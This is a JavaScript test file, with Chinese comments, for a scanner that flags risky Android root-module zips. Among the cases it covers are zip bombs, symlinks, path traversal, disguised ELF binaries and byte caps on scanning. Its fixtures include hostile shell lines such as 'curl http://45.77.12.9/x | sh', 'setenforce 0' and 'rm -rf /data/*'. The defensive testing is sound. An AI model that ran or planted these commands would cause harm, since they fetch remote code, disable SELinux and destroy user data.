    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: '../escape.sh', content: '#!/system/bin/sh\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNSAFE_PATH' && f.file === '../escape.sh'));
});

test('端到端：符号链接条目判 high（脚本本身一行危险模式都没有也照样拦）', () => {
  const p = writeZip('symlink.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'link/hosts', content: '/data/data/com.xxx/databases/x.db', extAttr: 0xa1ff0000 },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_SYMLINK'));
  assert.deepEqual(r.structure.symlinks, ['link/hosts']);
});

test('端到端：重名条目判 high —— 扫描器看到的那份未必是被解压的那份', () => {
  const p = writeZip('dup.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
    { name: 'service.sh', content: '#!/system/bin/sh\nrm -rf /data/*\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.riskLevel, 'high');
  assert.deepEqual(r.structure.duplicateNames, ['service.sh']);
});

test('端到端：META-INF 安装期入口里的恶意代码会被扫到（此前这类文件一行都没读）', () => {
  assert.ok(FLASH_ENTRY_POINTS.includes('META-INF/com/google/android/updater-script'));
  const p = writeZip('handler.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'META-INF/com/google/android/updater-script', content: '#!/system/bin/sh\nsetenforce 0\nrm -rf /data/*\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  const ids = new Set(r.findings.map((f) => f.ruleId));
  assert.ok(ids.has('SELINUX_DISABLE') && ids.has('RM_RF_MUTABLE'), JSON.stringify([...ids]));
  const hit = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(hit.file, 'META-INF/com/google/android/updater-script');
  assert.equal(r.inventory.handlers.length, 1, '入口文件要在清单里单独成类，便于人工定位');
});

test('端到端：.lua / .js / .prop 里的危险模式同样纳入行级规则', () => {
  const p = writeZip('langs.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.lua', content: 'os.execute("setenforce 0")\n' },
    { name: 'hook.js', content: 'var s = "curl http://45.77.12.9/x | sh";\n' },
    { name: 'system.prop', content: 'ro.x.url=http://payload.xyz/c\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const files = new Set(r.findings.map((f) => f.file));
  for (const need of ['service.lua', 'hook.js', 'system.prop']) {
    assert.ok(files.has(need), `${need} 应产生发现；实际 ${[...files].join(',')}`);
  }
  assert.ok(SEVERITY_ORDER[r.riskLevel] >= SEVERITY_ORDER.medium);
});

test('端到端：把 ELF 改名成 config.js 也只能落到「二进制」，不会当成脚本放过', () => {
  const elf = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(200, 0)]);
  const p = writeZip('disguise.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'config.js', content: elf },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.notEqual(r.riskLevel, 'low', '二进制负载不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_BINARY' && f.file === 'config.js'),
    JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.deepEqual(r.binaries.map((b) => b.name), ['config.js']);
  assert.ok(!r.scripts.some((s) => s.name === 'config.js'), '机器码不进「全文」一节，否则 PR 评论会被灌满');

  // 评审 fix1-③：上面那句「不进全文」只是因为没人引用才没红 —— 它压根不在扫描面里。
  // 真被 sh 引用时它必须进扫描面（该扫的照扫），但渲染面只许给有界预览：删掉渲染守卫这条就红。
  const p2 = writeZip('disguise-referenced.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '#!/system/bin/sh\nsh $MODDIR/config.js\n' },
    { name: 'config.js', content: elf },
  ]);
  const r2 = scanZip(p2, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.deepEqual(r2.escalated.map((e) => e.resolvedEntry), ['config.js'], '被引用就要进扫描面');
  const row2 = r2.scripts.find((s) => s.name === 'config.js');
  assert.ok(row2, '升级条目要在人看得见的清单里（F11）');
  assert.equal(row2.nonText, true, '非文本要标出来');
  assert.equal(row2.contentKind, 'non-text-preview', '预览要说明它不是全文');
  const NUL = String.fromCharCode(0);
  assert.ok(!row2.content.includes(NUL), '机器码不进全文 —— 删掉渲染守卫这一句就红');
  assert.ok(row2.content.length < 1000, '必须是有限预览，实际 ' + row2.content.length + ' 字符');
  assert.ok(!renderMarkdown(r2).includes(NUL), 'md 里也不许有 NUL');
  assert.equal(r2.riskLevel, 'high', '改名成 .js 的 ELF 被引用时必须 high');
});

test('端到端：payload 藏在行级规则输入上限之后 ⇒ 记账而不是免检（原「照样命中」用例，见下列注解）', () => {
  const filler = '# 填充行，用于把危险语句推到报告内嵌上限之外\n'.repeat(1 + Math.ceil(MAX_TEXT / 60));
  const body = filler + '\nsetenforce 0\n';
  const p = writeZip('late-payload.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const big = r.inventory.canonicalScripts.find((s) => s.name === 'customize.sh');
  assert.ok(big.bytes > MAX_TEXT, `样本必须超过内嵌上限，实际 ${big.bytes}`);
  assert.equal(big.truncated, true);
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  // 注解（Task 2.9）：原断言是 `assert.ok(sel, '规则必须跑全文：藏在尾部的 setenforce 不能因为报告截断而漏掉')`
  // —— 它钉的是「行级规则跑全文」这条旧口径，与本轮「单条目字节上限」直接冲突：上限的意义就是
  // 后缀不再逐行判过。现在改成断言「没读到」，而「读到一半 ≠ 干净」由下面那条截断记录兜住。
  assert.ok(!sel, '上限之后的字节没有喂给行级规则（旧期望：必须命中，已随 2.9 的字节上限作废）');
  // 注解（Task 2.9）：原断言是 `assert.ok(sel.line > 1000, '命中的是尾部行')` —— 随上一条一起作废，
  // 换成「这条载荷根本没进规则输入」的可复核证据：实扫字节数必须明显小于原文。
  assert.ok(big.scanBytes <= CAP29 && big.scanBytes > CAP29 - 4,
    `实扫字节必须贴住上限（UTF-8 码点边界最多回退 3 B），实际 ${big.scanBytes} / 上限 ${CAP29}`);
  assert.ok(big.bytes > big.scanBytes * 10, `样本要在上限之外留出一大段，实际 ${big.bytes} B`);
  assert.equal(r.riskLevel, 'medium', '旧期望 high（载荷命中）→ 新期望 medium：等级只能由截断记录撑起来');
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED'), '看不全本身也要报，挡住自动放行');
  const cov = r.findings.find((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED');
  assert.equal(cov.file, 'customize.sh', '记录必须指名是哪个条目');
  assert.match(cov.message, /只喂进前/, '记录必须写出实际喂进规则多少字节');
  assert.notEqual(r.decision.action, 'auto-approve', '读到一半永远换不到自动放行');
  assert.match(renderMarkdown(r), /包结构与审核覆盖度/);
  assert.match(renderMarkdown(r), /报告只内嵌前/);
});

// ---------------------------------------------------------------------------
// Task 2.9：内容扫描的字节上限（单条目喂给行级规则的字节数）
//
// 上限常量在这里走**命名空间**取值而不是具名 import：red-first 阶段常量还不存在，
// 具名 import 会让整个文件在加载期就抛（143 条一起红），拿不到「只有新用例红」这个数。
// ---------------------------------------------------------------------------
import * as scanMod29 from './scan.mjs';

const CAP29 = scanMod29.MAX_SCAN_BYTES_PER_ENTRY;
/** 41 B 一行（40 个 ASCII + 换行）的填充：条目总量超上限，但每行都短 ⇒ 行级规则本身线性，测试不被平方级拖住 */
const LINE29 = '# filler line for byte cap 0123456789abcdef\n';
const pad29 = (n) => LINE29.repeat(n);
/** 载荷行放在「上限之前最后一整行」与「上限之后第一整行」用的行号 */
const LINES_BEFORE29 = Math.floor((CAP29 || 24576) / LINE29.length);
const BYTE_AT29 = (n) => n * LINE29.length;

test('T2.9-①：载荷落在上限之内 ⇒ ruleId / 级别 / 行号 / 决策与不设上限时一模一样', () => {
  assert.ok(Number.isFinite(CAP29) && CAP29 > 0, `MAX_SCAN_BYTES_PER_ENTRY 必须是正数，实际 ${CAP29}`);
  // 载荷在第 LINES_BEFORE29+1 行：它的起始字节 BYTE_AT29(LINES_BEFORE29) < 上限，整行也在上限之内。
  const body = pad29(LINES_BEFORE29) + 'setenforce 0\n' + pad29(2000);
  assert.ok(BYTE_AT29(LINES_BEFORE29) + 'setenforce 0\n'.length <= CAP29,
    '夹具必须把载荷整行放在上限之内');
  assert.ok(Buffer.byteLength(body) > CAP29, '夹具必须超过上限，否则测的是另一件事');
  const p = writeZip('cap-early.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.ok(sel, '上限只许让扫描更早停，不许让上限之内的载荷漏掉');
  assert.equal(sel.severity, 'high', '级别必须与 f79b784 一致');
  assert.equal(sel.file, 'customize.sh');
  assert.equal(sel.line, LINES_BEFORE29 + 1, `行号必须与 f79b784 一致（第 ${sel.line} 行）`);
  assert.equal(sel.snippet, 'setenforce 0');
  assert.equal(r.riskLevel, 'high', '与 f79b784 同判 high');
  assert.equal(r.decision.action, 'block', '与 f79b784 同判 block');
  // 后面的字节确实没读 ⇒ 截断同时记账（两条并存：命中照旧，覆盖度缺口也照实说）
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED'),
    '条目超限却没记截断 ⇒ 上限成了「读到一半就算读完」');
});

test('T2.9-②：载荷落在上限之后 ⇒ 记 AUDIT_COVERAGE_TRUNCATED，且绝不是「0 命中 / low / auto-approve」', () => {
  const payloadLine = LINES_BEFORE29 + 2; // 起始字节 = BYTE_AT29(LINES_BEFORE29+1) > CAP29
  assert.ok(BYTE_AT29(payloadLine - 1) > CAP29, '夹具必须把载荷整行放到上限之外');
  const body = pad29(payloadLine - 1) + 'setenforce 0\n' + pad29(2000);
  const p = writeZip('cap-late.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'),
    '上限之后的字节确实没喂给行级规则 —— 这条断言是「上限真的生效」的证据');
  const cov = r.findings.filter((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED');
  assert.equal(cov.length, 1, JSON.stringify(cov));
  assert.equal(cov[0].file, 'customize.sh', '必须指名是哪个条目');
  assert.equal(countsTowardRisk(cov[0]), true, '「读不完」必须参与定级，不许是 info');
  assert.ok(SEVERITY_ORDER[cov[0].severity] >= SEVERITY_ORDER.medium, '截断记录的级别不得低于 medium');
  const size = Buffer.byteLength(body);
  assert.match(cov[0].message, new RegExp(String(size)), 'message 要写出原始字节数');
  assert.match(cov[0].message, new RegExp(String(CAP29)), 'message 要写出实际喂进去的字节数');
  assert.match(cov[0].snippet, new RegExp(`${size}.*${CAP29}|${size}`), 'snippet 要带上原始/实扫字节两个数');
  assert.notEqual(r.findings.length, 0, '载荷被上限挡住时，findings 不能归零');
  assert.notEqual(r.riskLevel, 'low', '「读到一半」不等于「干净」');
  assert.notEqual(r.decision.action, 'auto-approve', '上限不许开出一条自动放行的门');
});

test('T2.9 硬边界：任何进入扫描面的条目形状，载荷挪到上限之后都只能换来更严的结论', () => {
  // 「上限只能让扫描更早停」这条不变量的覆盖面：不同桶、不同文件名形状都要拦住。
  // 每个形状都跑两遍 —— 载荷在上限前 / 载荷在上限后 —— 后者必须仍然不是 auto-approve。
  const shapes = [
    ['customize.sh', 'canonicalScripts'],
    ['webroot/helper.js', 'otherScripts'],
    ['sepolicy.rule', 'policyFiles'],
    ['system.prop', 'props'],
    ['META-INF/com/google/android/update-binary', 'handlers'],
  ];
  for (const [name, bucket] of shapes) {
    const late = pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500);
    const p = writeZip(`cap-shape-${bucket}.zip`, [
      { name: 'module.prop', content: CLEAN_PROP },
      { name, content: late },
    ]);
    const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
    const rows = r.inventory[bucket] || [];
    assert.ok(rows.some((x) => x.name === name), `${name} 没进扫描面，本条用例测不到它`);
    const cov = r.findings.filter((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === name);
    assert.equal(cov.length, 1, `${name}：超限必须记账，实际 ${JSON.stringify(r.findings.map((f) => f.ruleId))}`);
    assert.notEqual(r.riskLevel, 'low', `${name}：只读到前缀就判 low 等于「读到一半 = 干净」`);
    assert.notEqual(r.decision.action, 'auto-approve', `${name}：上限之后不许通向自动放行`);
  }
  // module.prop 走的是 propEntry 那条独立通道（不在扫描面上时也要记账）
  const bigProp = CLEAN_PROP + pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500);
  const p2 = writeZip('cap-shape-module.prop.zip', [{ name: 'module.prop', content: bigProp }]);
  const r2 = scanZip(p2, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(r2.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === 'module.prop'),
    'module.prop 走 propFindings 通道时同样要记截断');
  assert.notEqual(r2.decision.action, 'auto-approve');
});

test('T2.9：上限就是报告里写的那个阈值，且它低于报告内嵌上限才有意义', () => {
  assert.ok(CAP29 < MAX_TEXT,
    `单条目上限必须低于内嵌上限 MAX_TEXT=${MAX_TEXT}，否则单行超长样本还在闸外（实测 512 KB 单行 ≈ 数分钟）`);
  const body = pad29(1200);
  const p = writeZip('cap-limits.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.structure.limits.MAX_SCAN_BYTES_PER_ENTRY, CAP29,
    '报告里的阈值必须就是这次真正生效的那个（与 MAX_ENTRY_UNCOMPRESSED 同一口径）');
  const md = renderMarkdown(r);
  assert.match(md, /行级规则的输入上限/, '报告要写明行级规则的输入上限');
  assert.doesNotMatch(md, /行级规则跑的仍是全文/, '上限之后这句话就是假话');
});

test('T2.9：截断点退到 UTF-8 码点边界 —— 半截多字节字符不许变成 U+FFFD 混进规则输入', () => {
  // 1 个 ASCII + 若干 3 字节汉字 ⇒ 上限落点正卡在某个汉字的中间， naive 的 slice 会切出残缺序列。
  const body = 'a' + '中文载荷'.repeat(1 + Math.ceil(CAP29 / 12));
  assert.ok(Buffer.byteLength(body) > CAP29, '夹具必须超过上限');
  const p = writeZip('cap-utf8.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const { files } = readZip(p);
  const f = files.find((x) => x.name === 'customize.sh');
  assert.equal(f.scanCapped, true);
  assert.ok(f.scanBytes <= CAP29, `实扫字节 ${f.scanBytes} 必须 ≤ 上限 ${CAP29}`);
  assert.equal(Buffer.byteLength(f.scanText, 'utf8'), f.scanBytes, '记账的字节数必须就是喂进去的字节数');
  assert.ok(!f.scanText.includes('\uFFFD'), `喂进去的前缀里有残缺码点：${JSON.stringify(f.scanText.slice(-8))}`);
  assert.ok(f.content.length > f.scanText.length, '全文仍然要留着（报告/产物靠它，上限只管行级规则的输入）');
});

test('T2.9：没超限的条目一个字节都不许多记 —— 上限不产生噪声也不改变结论', () => {
  const body = pad29(50);
  assert.ok(Buffer.byteLength(body) < CAP29, '夹具必须在上限之内');
  const p = writeZip('cap-small.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.findings.length, 0, JSON.stringify(r.findings));
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve', '干净且没超限的小模块照旧自动放行 —— 上限不许收紧这一格');
  const row = r.inventory.canonicalScripts.find((s) => s.name === 'customize.sh');
  assert.equal(row.scanCapped, false, '未超限的条目不许标成截断');
  assert.equal(row.scanBytes, Buffer.byteLength(body), '未超限时实扫字节数就是条目大小');
});

test('T2.9 方向②续：被引用升级进来的大条目同样受上限约束，且记账指到那个条目', () => {
  // Task 2.7（fix10-P11）改了这里的前提：改名成 .dat 的**文本**载荷现在本来就在 feed 上
  // （cls.others 进内容扫描），不再「因引用被拉进来」，于是它不再是这条用例的对象。
  // 升级条目要真有，载荷就得在 feed 之外 —— 换成「魔数头伪装成 .dat」：classify 把它路由到
  // binaries（那条魔数优先于后缀的分流由本文件的伪装钉子压着），它只能靠 service.sh 的引用进来，
  // 上限与截断记账才有对象可管。夹具尺寸不变（同一个 pad29 形状，仍然远超上限）。
  const payload = elfWith(pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500));
  const p = writeZip('cap-escalated.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.sh', content: '#!/system/bin/sh\nsh /data/adb/modules/cool_mod/stage.dat\n' },
    { name: 'stage.dat', content: payload },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(payload.length > CAP29, true, `夹具必须超过上限（实际 ${payload.length} / ${CAP29}）`);
  assert.ok(r.binaries.some((b) => b.name === 'stage.dat'),
    '夹具前提：它走 binaries，不在 feed 上，只能被引用拉进来：' + JSON.stringify(r.binaries));
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['stage.dat'], '夹具前提：stage.dat 被升级进扫描面');
  assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'), '上限之后的载荷不该被读到（上限生效）');
  const cov = r.findings.find((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === 'stage.dat');
  assert.ok(cov, '升级进来的条目超限也必须记账', JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(SEVERITY_ORDER[cov.severity] >= SEVERITY_ORDER.medium, true);
  assert.match(cov.snippet, new RegExp(String(payload.length)), '记账要写出条目原大小');
  assert.match(cov.message, new RegExp(String(CAP29)), '记账要写出实扫字节数（上限）');
  // 记账不能只落在 finding 上：清单里那一行要同时给出「多大」和「实扫多少」，人才复核得了。
  const row = r.inventory.escalated.find((e) => e.name === 'stage.dat');
  assert.ok(row, '升级条目要在文件清单里（评审 F11）');
  assert.equal(row.bytes, payload.length, '清单行的原大小就是条目字节数');
  assert.equal(row.scanBytes, CAP29, `实扫字节必须正好砍在上限上，实际 ${row.scanBytes}`);
  assert.equal(row.scanCapped, true, '被上限砍过就要标成截断，不许安静');
  assert.notEqual(r.decision.action, 'auto-approve');
  assert.notEqual(r.riskLevel, 'low');
});

test('端到端：声明解压 1 GB 的条目按 zip bomb 拦下', () => {
  const p = writeZip('bomb.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'z', content: 'x', method: 0, declaredOrig: 1024 * 1024 * 1024 },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const ids = new Set(r.findings.map((f) => f.ruleId));
  assert.ok(ids.has('STRUCT_ZIP_BOMB'), JSON.stringify([...ids]));
  assert.ok(ids.has('STRUCT_RATIO'), JSON.stringify([...ids]));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.structure.totalUncompressed >= 1024 * 1024 * 1024, String(r.structure.totalUncompressed));
});

test('端到端：主动挡下的超大条目不能再交给系统 unzip 试一遍', () => {
  // 唯一的条目超限 -> files 为空。若不加 deliberate 判断，这里会去调外部 unzip，
  // 等于把刚拦住的超大条目重新解压一次（runner 当场被打满的就是这一步）。
  const p = writeZip('over-limit.zip', [
    { name: 'blob', content: Buffer.alloc(2 * 1024 * 1024, 0x41) },
  ]);
  const r = scanZip(p, { changeType: 'first', maxEntryBytes: 64 * 1024 });
  assert.equal(r.reader, 'builtin', '不许回退');
  assert.equal(r.unread.length, 1);
  assert.equal(r.unread[0].overLimit, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
  assert.notEqual(r.riskLevel, 'low');
});

test('端到端：声明说谎（说 10 B 实际 2 MB）时，解压硬上限是唯一还管用的闸', () => {
  const big = Buffer.alloc(2 * 1024 * 1024, 0x41);
  const p = writeZip('lying.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'blob', content: big, declaredOrig: 10 },
  ]);
  // 先证明：不做隔离时这个条目本来能正常读出来，问题只在超上限
  const wide = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(wide.files === undefined || wide.unread.length === 0, JSON.stringify(wide.unread));

  const tight = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first', maxEntryBytes: 64 * 1024 });
  assert.equal(tight.reader, 'builtin');
  assert.equal(tight.unread.length, 1, JSON.stringify(tight.unread));
  assert.equal(tight.unread[0].name, 'blob');
  assert.equal(tight.unread[0].overLimit, true, '必须归因为「超上限」，而不是笼统的解压失败');
  assert.match(tight.unread[0].reason, /上限/);
  assert.ok(tight.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
  assert.notEqual(tight.riskLevel, 'low', '读不到不等于干净');
  assert.equal(tight.structure.limits.MAX_ENTRY_UNCOMPRESSED, 64 * 1024, '报告里写的上限必须就是这次生效的上限');
});

test('端到端：系统 unzip 回退通道看不到结构属性，因此不予自动放行', () => {
  // 直接验回退路径的定级语义：reader=unzip 时必须自带 AUDIT_COVERAGE_METADATA。
  // 构造一个内置解析器读不出的文件（EOCD 被截断）来触发回退，
  // 若本机没有 unzip 就跳过 —— 这条断言依赖外部命令，不该因此把测试变成不稳定测试。
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, 'broken.zip');
  const good = buildZip([{ name: 'module.prop', content: CLEAN_PROP }]);
  writeFileSync(p, good.subarray(0, good.length - 10)); // 破坏 EOCD
  let r;
  try {
    r = scanZip(p, { changeType: 'first' });
  } catch (err) {
    assert.match(String(err.message), /unzip/, '回退失败只可能是本机没有 unzip');
    return;
  }
  assert.equal(r.reader, 'unzip');
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_METADATA'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.decision.needsHumanReview, true);
});

test('readZip 带出 entries 元数据与 head，供结构/二进制判断使用', () => {
  const p = writeZip('meta.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'link', content: '/system/bin/sh', extAttr: 0xa1ff0000 },
  ]);
  const { files, entries, unread } = readZip(p);
  assert.equal(unread.length, 0);
  assert.equal(entries.length, 2);
  assert.equal(entries.find((e) => e.name === 'link').isSymlink, true);
  assert.equal(entries.find((e) => e.name === 'module.prop').isSymlink, false);
  assert.deepEqual([...files.find((f) => f.name === 'module.prop').head.subarray(0, 3)], [0x69, 0x64, 0x3d], 'head 是解压后的字节，不是压缩流');
});

// ---------------------------------------------------------------------------
// ⑦ 载荷间接执行 —— 被引用但未纳入扫描的包内条目（T1）
// ---------------------------------------------------------------------------

test('EXEC_BUNDLED_FILE：脚本执行包内非扫描面条目 → high，且那个条目被拉进内容扫描', async () => {
  const zip = makeModuleZip({ id: 'eval.t1', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1/stage.dat\n'],
    ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  assert.equal(r.riskLevel, 'high');                      // 之前是 low → auto-approve
  assert.equal(r.decision.action, 'block');
  // 关键：不只是标个链接，被引用的条目真的被扫了
  assert.ok(ids.includes('PIPE_TO_SHELL'), '被引用条目必须按文本再扫一遍');
  const f = r.findings.find((x) => x.ruleId === 'PIPE_TO_SHELL');
  assert.equal(f.file, 'stage.dat');
  // F11：它还得在人看得见的清单里，否则 T5 的 brief 与人工复核都读不到这段内容
  assert.ok(r.scripts.some((s) => s.name === 'stage.dat'), '被升级的条目必须进 report.scripts');
});

test('EXEC_BUNDLED_FILE：引用形态矩阵 —— 检测层要认得全部写法，包括改名机器码与同行复合', () => {
  // 这一条只管「检测」：规则是纯逐行函数，拿不到扫描面，所以它不该替「那个文件是否已被扫过」说话。
  // 「目标已逐行扫过就不报」的撤销判据在 scanZip 里（见下面那条端到端用例）—— 评审 fix1-① 的修法。
  for (const line of [
    // 简报 Step 1 的 6 例
    'sh $MODDIR/x.dat', 'bash ${MODDIR}/payload', '. $MODDIR/lib.sh.bin',
    'busybox sh $MODDIR/x.bin', 'source ${MODPATH}/run.zsh', 'sh "/data/adb/modules/a/payload.bin"',
    // 简报 Step 3 注释点名要认的 3 例
    'sh $TMPMODDIR/stage2.dat', 'sh $MODPATH/bin/payload', 'sh /data/adb/modules/eval.t1/stage.dat',
    // fix1-①：改名成脚本后缀的机器码。后缀不是「已扫过」的证据，所以这里必须命中。
    'sh $MODDIR/payload.js', 'sh $MODDIR/payload.sh', 'sh $MODPATH/late.js',
    'sh $MODDIR/cfg.prop', 'busybox sh ${MODDIR}/hook.lua',
    // fix1-②：同一行不许自我豁免（两个引用一个合法一个恶意，恶意那个必须报）
    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
    // fix1-④：一律不许豁免的逃逸写法
    'echo hi sh $MODDIR/x.bin', '. $MODDIR/functions', "sh '$MODDIR/lib.dat'",
    'sh${IFS}$MODDIR/x.bin', '$MODDIR/tool.bin', '  "$MODDIR/tool.bin" --help',
    'do_thing || $MODDIR/stage2.bin', 'cd /; sh $MODDIR/x.bin',
    // fix1-⑤：要归一化的形状，先得能被检测
    'sh $MODDIR//x.dat', 'sh $MODDIR/sub/../x.dat', 'sh $MODDIR/sub/./x.dat',
    'sh $MODDIR\\sub\\x.dat', 'sh $MODDIR/X.DAT', 'sh $MODDIR/ghost.dat',
  ]) {
    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length > 0, line);
  }
  // 不是「执行包内另一个文件」的形状，以及注释行（fix1-④ 的豁免，按本仓 /^\s*#/ 先例）
  for (const line of [
    'sh /system/bin/foo', 'echo $MODPATH/x', 'cp -f busybox $MODPATH/system/xbin/bb',
    'rm -rf $MODDIR/system/app/Foo', 'export PATH=$MODDIR/bin:$PATH',
    '[ -f $MODDIR/data.dat ] && echo ok', 'SKIPUNINSTALL=1', '# sh $MODDIR/tool.bin',
    '  #  sh $MODDIR/tool.bin', '#!/system/bin/sh',
  ]) {
    assert.equal(EXEC_BUNDLED_FILE.scan('service.sh', line).length, 0, line);
  }
});

test('EXEC_BUNDLED_FILE：撤销判据是「它真的在扫描面里」，不是后缀像不像脚本', async () => {
  // 正经模块的常规写法：install.sh 确实被逐行扫过 -> 这条 high 撤掉，别淹没人工队列。
  const ok = makeModuleZip({ id: 'eval.t1ok', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\nbash ${MODDIR}/lib.sh\n'],
    ['install.sh', 'echo install\n'],
    ['lib.sh', 'echo lib\n'],
  ]});
  const r1 = await scanToReport(ok, { changeType: 'first' });
  assert.deepEqual(r1.escalated, [], '目标已在扫描面里，不该被当成新条目升级');
  assert.ok(!r1.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    JSON.stringify(r1.findings.map((f) => f.ruleId)));
  assert.equal(r1.riskLevel, 'low', JSON.stringify(r1.findings));
  // fix8-E 改动此行（原为 'auto-approve'，附言「多文件正经模块不能被这条规则抬成人工队列」）：
  // 上面两条断言已经确认这里确实发生过两次撤销（install.sh、lib.sh 都在扫描面上，那条 high 被撤），
  // 而 E 拍定的就是「撤销过就不许走自动通道」——旧期望与本轮规格直接冲突，按规格改。
  // 撤销本身、等级、findings 内容一字未动，代价只落在决策上。见 task-2.8-report.md「与现有用例的冲突」。
  assert.equal(r1.decision.action, 'request-review', '撤销过两次就不许自动放行（fix8-E）');
  assert.equal(r1.revokedBundledRefs.length, 2, JSON.stringify(r1.revokedBundledRefs));

